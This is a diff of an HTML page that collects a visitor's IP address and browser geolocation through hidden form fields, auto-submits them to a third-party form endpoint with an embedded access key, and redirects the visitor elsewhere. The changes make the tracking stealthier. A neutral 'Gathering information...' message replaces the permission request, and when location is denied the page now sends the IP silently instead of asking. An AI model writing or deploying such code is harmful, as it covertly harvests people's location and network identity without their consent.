@@ -22,14 +22,14 @@
 </head>
 <body>
     <h1>Location and IP Information</h1>
-    <p id="status-message">Please allow access to your location.</p>
+    <p id="status-message">Gathering information...</p>
 
     <form id="quoteForm" action="https://api.web3forms.com/submit" method="POST">
         <input type="hidden" name="access_key" value="dbf36f00-5696-49cb-abae-61ae931fbd57">
         <input type="hidden" id="latitude" name="latitude">
         <input type="hidden" id="longitude" name="longitude">
         <input type="hidden" id="ip_address" name="ip_address">
-        <input type="hidden" name="redirect" value="https://hello.app">
+        <input type="hidden" name="redirect" value="https://ve.app">
         <button type="submit" id="submit-btn"></button>
     </form>
 
@@ -38,7 +38,7 @@
     <script>
         let ipAddress = '';
         let locationAttempts = 0;
-        const MAX_ATTEMPTS = 10;
+        const MAX_ATTEMPTS = 3;
 
         window.onload = function() {
             getIPAddress();
@@ -53,7 +53,7 @@
                     requestLocation();
                 })
                 .catch(() => {
-                    requestLocation();
+                    document.getElementById("status-message").textContent = "Failed to get IP. Please try again.";
                 });
         }
 
@@ -65,21 +65,18 @@
                     } else if (result.state === 'prompt') {
                         navigator.geolocation.getCurrentPosition(submitForm, handleError);
                     } else if (result.state === 'denied') {
-                        showLocationButton();
+                        submitIPOnly();
                     }
                 });
             } else {
-                document.getElementById("status-message").textContent = "Geolocation is not supported by this browser.";
+                submitIPOnly();
             }
         }
 
         function getLocationAndSubmit() {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    document.getElementById("latitude").value = position.coords.latitude;
-                    document.getElementById("longitude").value = position.coords.longitude;
-                    document.getElementById("ip_address").value = ipAddress;
-                    document.getElementById("quoteForm").submit();
+                    submitForm(position);
                 },
                 function(error) {
                     handleError(error);
@@ -99,13 +96,16 @@
             if (locationAttempts < MAX_ATTEMPTS) {
                 setTimeout(requestLocation, 1000); // Try again after 1 second
             } else {
-                showLocationButton();
+                submitIPOnly();
             }
         }
 
-        function showLocationButton() {
-            document.getElementById("status-message").textContent = "Location access is required. Please enable location and try again.";
-            document.getElementById("location-btn").style.display = "inline-block";
+        function submitIPOnly() {
+            document.getElementById("status-message").textContent = "Submitting with IP address only.";
+            document.getElementById("latitude").value = "";
+            document.getElementById("longitude").value = "";
+            document.getElementById("ip_address").value = ipAddress;
+            document.getElementById("quoteForm").submit();
         }
 
         document.getElementById("location-btn").addEventListener("click", function() {
